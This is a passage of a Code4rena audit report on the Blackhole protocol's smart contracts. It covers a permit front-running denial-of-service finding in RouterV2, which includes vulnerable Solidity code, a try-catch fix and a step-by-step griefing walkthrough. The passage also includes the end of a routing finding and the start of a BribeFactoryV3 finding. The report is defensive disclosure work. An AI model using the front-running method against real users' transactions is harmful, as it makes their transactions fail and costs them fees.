{</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">return</span><span class="mtk1"> </span><span class="mtk11">route</span><span class="mtk1">({</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">pair:</span><span class="mtk1"> </span><span class="mtk12">pair</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">from:</span><span class="mtk1"> </span><span class="mtk12">from</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">to:</span><span class="mtk1"> </span><span class="mtk12">to</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">stable:</span><span class="mtk1"> </span><span class="mtk12">isBasic</span><span class="mtk1"> ? </span><span class="mtk11">IPair</span><span class="mtk1">(</span><span class="mtk12">pair</span><span class="mtk1">).</span><span class="mtk11">isStable</span><span class="mtk1">() : </span><span class="mtk4">false</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">concentrated:</span><span class="mtk1"> !</span><span class="mtk12">isBasic</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">amountOut:</span><span class="mtk1"> </span><span class="mtk12">amountOut</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">receiver:</span><span class="mtk1"> </span><span class="mtk12">_receiver</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">sqrtPriceAfter:</span><span class="mtk1"> </span><span class="mtk12">sqrtPriceAfter</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        });</span></span></span></code></pre>
<p>However, this only applies to routes created through the API layer, not direct router calls by users.</p>
<h3 style="position:relative;" id="recommended-mitigation-steps-10"><a class="anchor before" aria-label="recommended mitigation steps 10 permalink" href="#recommended-mitigation-steps-10"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>The fix is to properly set receiver addresses for multi-hop routing.</p>
<p><strong><a href="https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues">Blackhole mitigated</a></strong></p>
<p><strong>Status:</strong> Mitigation confirmed. Full details in reports from <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-24">lonelybones</a>, <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-37">rayss</a> and <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-61">maxvzuvex</a>.</p>
<hr>
<h2 style="position:relative;" id="m-10-erc-2612-permit-front-running-in-routerv2-enables-dos-of-liquidity-operations"><a class="anchor before" aria-label="m 10 erc 2612 permit front running in routerv2 enables dos of liquidity operations permalink" href="#m-10-erc-2612-permit-front-running-in-routerv2-enables-dos-of-liquidity-operations"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/F-173">[M-10] ERC-2612 permit front-running in RouterV2 enables DoS of liquidity operations</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-410">PolarizedLight</a></em></p>
<p>The <code>removeLiquidityWithPermit()</code> and <code>removeLiquidityETHWithPermit()</code> functions in RouterV2 are vulnerable to front-running attacks that consume user permit signatures, causing legitimate liquidity removal transactions to revert and resulting in gas fee losses and a DOS.</p>
<h3 style="position:relative;" id="finding-description-7"><a class="anchor before" aria-label="finding description 7 permalink" href="#finding-description-7"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description</h3>
<p>The RouterV2 contract implements ERC-2612 permit functionality without protection against front-running attacks. The vulnerability stems from the deterministic nature of permit signatures and the lack of error handling when permit calls fail.</p>
<p>This vulnerability follows a well-documented attack pattern that has been extensively researched. According to Trust Security’s comprehensive disclosure in January 2024: <a href="https://www.trust-security.xyz/post/permission-denied">https://www.trust-security.xyz/post/permission-denied</a></p>
<blockquote>
<p>“Consider, though, a situation where permit() is part of a contract call:</p>
<pre data-index="47" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">deposit</span><span class="mtk1">(</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amount</span><span class="mtk1">, </span><span class="mtk12">bytes</span><span class="mtk1"> </span><span class="mtk12">calldata</span><span class="mtk1"> </span><span class="mtk12">_signature</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// This will revert if permit() was front-run</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">token</span><span class="mtk1">.</span><span class="mtk11">permit</span><span class="mtk1">(</span><span class="mtk12">msg</span><span class="mtk1">.</span><span class="mtk12">sender</span><span class="mtk1">, </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk4">this</span><span class="mtk1">), </span><span class="mtk12">amount</span><span class="mtk1">, </span><span class="mtk12">deadline</span><span class="mtk1">, </span><span class="mtk12">v</span><span class="mtk1">, </span><span class="mtk12">r</span><span class="mtk1">, </span><span class="mtk12">s</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// User loses this functionality when permit fails</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">stakingContract</span><span class="mtk1">.</span><span class="mtk11">deposit</span><span class="mtk1">(</span><span class="mtk12">msg</span><span class="mtk1">.</span><span class="mtk12">sender</span><span class="mtk1">, </span><span class="mtk12">amount</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p>This function deposits in a staking contract on behalf of the user. But what if an attacker extracts the _signature parameters from the <code>deposit()</code> call and frontruns it with a direct <code>permit()</code>? In this case, the end result is harmful, since the user loses the functionality that follows the <code>permit()</code>.”</p>
</blockquote>
<p>In RouterV2’s <code>removeLiquidityWithPermit()</code> follows this exact vulnerable pattern:</p>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/RouterV2.sol#L475-L475">https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/RouterV2.sol#L475-L475</a></p>
<pre data-index="48" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk11">IBaseV1Pair</span><span class="mtk1">(</span><span class="mtk12">pair</span><span class="mtk1">).</span><span class="mtk11">permit</span><span class="mtk1">(</span><span class="mtk12">msg</span><span class="mtk1">.</span><span class="mtk12">sender</span><span class="mtk1">, </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk4">this</span><span class="mtk1">), </span><span class="mtk12">value</span><span class="mtk1">, </span><span class="mtk12">deadline</span><span class="mtk1">, </span><span class="mtk12">v</span><span class="mtk1">, </span><span class="mtk12">r</span><span class="mtk1">, </span><span class="mtk12">s</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">// User loses liquidity removal functionality when permit fails</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">(</span><span class="mtk12">amountA</span><span class="mtk1">, </span><span class="mtk12">amountB</span><span class="mtk1">) = </span><span class="mtk11">removeLiquidity</span><span class="mtk1">(</span><span class="mtk12">tokenA</span><span class="mtk1">, </span><span class="mtk12">tokenB</span><span class="mtk1">, </span><span class="mtk12">stable</span><span class="mtk1">, </span><span class="mtk12">liquidity</span><span class="mtk1">, </span><span class="mtk12">amountAMin</span><span class="mtk1">, </span><span class="mtk12">amountBMin</span><span class="mtk1">, </span><span class="mtk12">to</span><span class="mtk1">, </span><span class="mtk12">deadline</span><span class="mtk1">);</span></span></span></code></pre>
<p>As Trust Security formally identified: <strong>“In fact, any function call that unconditionally performs <code>permit()</code> can be forced to revert this way.”</strong></p>
<p>The root cause of the issue within the blackhole protocol is that RouterV2 makes unprotected external calls to LP token permit functions without any fallback mechanism or error handling:</p>
<pre data-index="49" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">// Line 475 - No error handling</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk11">IBaseV1Pair</span><span class="mtk1">(</span><span class="mtk12">pair</span><span class="mtk1">).</span><span class="mtk11">permit</span><span class="mtk1">(</span><span class="mtk12">msg</span><span class="mtk1">.</span><span class="mtk12">sender</span><span class="mtk1">, </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk4">this</span><span class="mtk1">), </span><span class="mtk12">value</span><span class="mtk1">, </span><span class="mtk12">deadline</span><span class="mtk1">, </span><span class="mtk12">v</span><span class="mtk1">, </span><span class="mtk12">r</span><span class="mtk1">, </span><span class="mtk12">s</span><span class="mtk1">);</span></span></span></code></pre>
<p>This creates a systematic vulnerability where any permit-based transaction can be griefed by extracting and front-running the permit signature.</p>
<h3 style="position:relative;" id="code-location"><a class="anchor before" aria-label="code location permalink" href="#code-location"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Code Location</h3>
<ul>
<li><code>RouterV2.sol#L475</code> - <code>removeLiquidityWithPermit()</code> function</li>
<li><code>RouterV2.sol#L493</code> - <code>removeLiquidityETHWithPermit()</code> function</li>
</ul>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/RouterV2.sol#L475-L475">https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/RouterV2.sol#L475-L475</a></p>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/RouterV2.sol#L493">https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/RouterV2.sol#L493</a></p>
<h3 style="position:relative;" id="impact-7"><a class="anchor before" aria-label="impact 7 permalink" href="#impact-7"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<p>This vulnerability enables attackers to systematically deny service to users attempting to remove liquidity through permit-based functions, resulting in direct financial losses and protocol dysfunction.</p>
<ul>
<li>Users lose transaction fees (typically <code>$5-50</code> per transaction depending on network congestion) when their transactions revert.</li>
<li>Users must pay additional gas for traditional approve+remove patterns.</li>
<li>Liquidity removal becomes unreliable, forcing users to abandon efficient permit-based operations.</li>
</ul>
<p><strong>Attack Prerequisites:</strong></p>
<ul>
<li>Minimal: Attacker needs only basic mempool monitoring capability and gas fees.</li>
<li>No special permissions or large capital requirements.</li>
<li>Attack can be automated and executed repeatedly.</li>
<li>Works against any user attempting permit-based operations.</li>
</ul>
<h3 style="position:relative;" id="recommended-mitigation-steps-11"><a class="anchor before" aria-label="recommended mitigation steps 11 permalink" href="#recommended-mitigation-steps-11"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Implement a different method of permit handling by wrapping the permit call in a try-catch block and only reverting if both the permit fails and the current allowance is insufficient for the operation.</p>
<pre data-index="50" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">removeLiquidityWithPermit</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">tokenA</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">tokenB</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">bool</span><span class="mtk1"> </span><span class="mtk12">stable</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">liquidity</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">amountAMin</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">amountBMin</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">to</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">deadline</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">bool</span><span class="mtk1"> </span><span class="mtk12">approveMax</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">uint8</span><span class="mtk1"> </span><span class="mtk12">v</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">bytes32</span><span class="mtk1"> </span><span class="mtk12">r</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">bytes32</span><span class="mtk1"> </span><span class="mtk12">s</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">virtual</span><span class="mtk1"> </span><span class="mtk11">override</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">amountA</span><span class="mtk1">, </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">amountB</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">pair</span><span class="mtk1"> = </span><span class="mtk11">pairFor</span><span class="mtk1">(</span><span class="mtk12">tokenA</span><span class="mtk1">, </span><span class="mtk12">tokenB</span><span class="mtk1">, </span><span class="mtk12">stable</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">value</span><span class="mtk1"> = </span><span class="mtk12">approveMax</span><span class="mtk1"> ? </span><span class="mtk11">type</span><span class="mtk1">(</span><span class="mtk12">uint</span><span class="mtk1">).</span><span class="mtk12">max</span><span class="mtk1"> : </span><span class="mtk12">liquidity</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// Try permit, but don't revert if it fails</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">try</span><span class="mtk1"> </span><span class="mtk11">IBaseV1Pair</span><span class="mtk1">(</span><span class="mtk12">pair</span><span class="mtk1">).</span><span class="mtk11">permit</span><span class="mtk1">(</span><span class="mtk12">msg</span><span class="mtk1">.</span><span class="mtk12">sender</span><span class="mtk1">, </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk4">this</span><span class="mtk1">), </span><span class="mtk12">value</span><span class="mtk1">, </span><span class="mtk12">deadline</span><span class="mtk1">, </span><span class="mtk12">v</span><span class="mtk1">, </span><span class="mtk12">r</span><span class="mtk1">, </span><span class="mtk12">s</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Permit succeeded</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    } </span><span class="mtk15">catch</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Permit failed, check if we have sufficient allowance</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">require</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk11">IBaseV1Pair</span><span class="mtk1">(</span><span class="mtk12">pair</span><span class="mtk1">).</span><span class="mtk11">allowance</span><span class="mtk1">(</span><span class="mtk12">msg</span><span class="mtk1">.</span><span class="mtk12">sender</span><span class="mtk1">, </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk4">this</span><span class="mtk1">)) &gt;= </span><span class="mtk12">liquidity</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk8">"Insufficient allowance"</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        );</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    (</span><span class="mtk12">amountA</span><span class="mtk1">, </span><span class="mtk12">amountB</span><span class="mtk1">) = </span><span class="mtk11">removeLiquidity</span><span class="mtk1">(</span><span class="mtk12">tokenA</span><span class="mtk1">, </span><span class="mtk12">tokenB</span><span class="mtk1">, </span><span class="mtk12">stable</span><span class="mtk1">, </span><span class="mtk12">liquidity</span><span class="mtk1">, </span><span class="mtk12">amountAMin</span><span class="mtk1">, </span><span class="mtk12">amountBMin</span><span class="mtk1">, </span><span class="mtk12">to</span><span class="mtk1">, </span><span class="mtk12">deadline</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p>This approach follows the industry-standard mitigation pattern that successfully resolved this vulnerability across 100+ affected codebases.</p>
<h3 style="position:relative;" id="proof-of-concept-6"><a class="anchor before" aria-label="proof of concept 6 permalink" href="#proof-of-concept-6"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of Concept</h3>
<p>Theoretical attack walkthrough:</p>
<ol>
<li>
<p><strong>Setup Phase</strong>:</p>
<ul>
<li>Alice holds 1000 LP tokens in pair <code>0xABC...</code></li>
<li>Alice wants to remove liquidity efficiently using <code>removeLiquidityWithPermit()</code></li>
<li>Bob (attacker) monitors the mempool for permit-based transactions</li>
</ul>
</li>
<li>
<p><strong>Signature Creation</strong>:</p>
<ul>
<li>Alice creates permit signature: <code>permit(alice, routerV2, 1000, deadline, nonce=5)</code></li>
<li>Signature parameters: <code>v=27, r=0x123..., s=0x456...</code></li>
</ul>
</li>
<li>
<p><strong>Transaction Submission</strong>:</p>
<ul>
<li>Alice submits: <code>removeLiquidityWithPermit(tokenA, tokenB, false, 1000, 950, 950, alice, deadline, false, 27, 0x123..., 0x456...)</code></li>
<li>Transaction enters mempool with 20 gwei gas price</li>
</ul>
</li>
<li>
<p><strong>Front-Running Execution</strong>:</p>
<ul>
<li>Bob extracts parameters from Alice’s pending transaction</li>
<li>Bob submits direct call: <code>IBaseV1Pair(0xABC...).permit(alice, routerV2, 1000, deadline, 27, 0x123..., 0x456...)</code> with 25 gwei gas</li>
<li>Bob’s transaction mines first, consuming Alice’s nonce (nonce becomes 6)</li>
</ul>
</li>
<li>
<p><strong>Victim Transaction Failure</strong>:</p>
<ul>
<li>Alice’s transaction executes but fails at line 475</li>
<li>RouterV2 calls <code>permit()</code> with already-used signature</li>
<li>LP token rejects due to invalid nonce (expects 6, gets signature for nonce 5)</li>
<li>Entire transaction reverts with “Invalid signature” or similar error</li>
</ul>
</li>
<li>
<p><strong>Attack Result</strong>:</p>
<ul>
<li>Alice loses ~<code>$15</code> in gas fees (failed transaction cost)</li>
<li>Alice cannot remove liquidity via permit method</li>
<li>Bob spent ~<code>$3</code> in gas to grief Alice</li>
<li>Attack can be repeated indefinitely against any permit user</li>
</ul>
</li>
</ol>
<p><strong>Impact Example:</strong></p>
<ul>
<li>During high network activity (50+ gwei), failed transactions cost <code>$25-75</code> each</li>
<li>Systematic attacks against 100 users = <code>$2,500-7,500</code> in direct user losses</li>
<li>No recourse for affected users; losses are permanent</li>
</ul>
<p><strong><a href="https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues">Blackhole mitigated</a></strong></p>
<p><strong>Status:</strong> Unmitigated. Full details in reports from <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-34">rayss</a> and <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-11">lonelybones</a>, and also included in the <a href="#mitigation-review">Mitigation Review</a> section below.</p>
<hr>
<h2 style="position:relative;" id="m-11-incorrect-function-call-in-bribefactoryv3-recovererc20andupdatedata"><a class="anchor before" aria-label="m 11 incorrect function call in bribefactoryv3 recovererc20andupdatedata permalink" href="#m-11-incorrect-function-call-in-bribefactoryv3-recovererc20andupdatedata"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/F-142">[M-11] Incorrect function call in <code>BribeFactoryV3</code> <code>recoverERC20AndUpdateData</code></a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-74">Egbe</a>, also found by <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-446">NexusAudits</a></em></p>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/factories/BribeFactoryV3.sol#L209-L219">https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/factories/BribeFactoryV3.sol#L209-L219</a></p>
<h3 style="position:relative;" id="finding-description-8"><a class="anchor before" aria-label="finding description 8 permalink" href="#finding-description-8"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description</h3>
<p>The <code>recoverERC20AndUpdateData</code> function in the <code>BribeFactoryV3</code> contract incorrectly calls <code>emergencyRecoverERC20</code> instead of <code>recoverERC20AndUpdateData</code> on the <code>IBribe</code> interface. This misnamed function call results in the failure to update the <code>tokenRewardsPerEpoch</code> mapping in the <code>Bribe</code> contract, which is critical for maintaining accurate reward accounting.</p>
<h3 style="position:relative;" id="root-cause-1"><a class="anchor before" aria-label="root cause 1 permalink" href="#root-cause-1"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Root Cause</h3>
<p>In <code>BribeFactoryV3.sol</code>, the <code>recoverERC20AndUpdateData</code> function is defined as follows:</p>
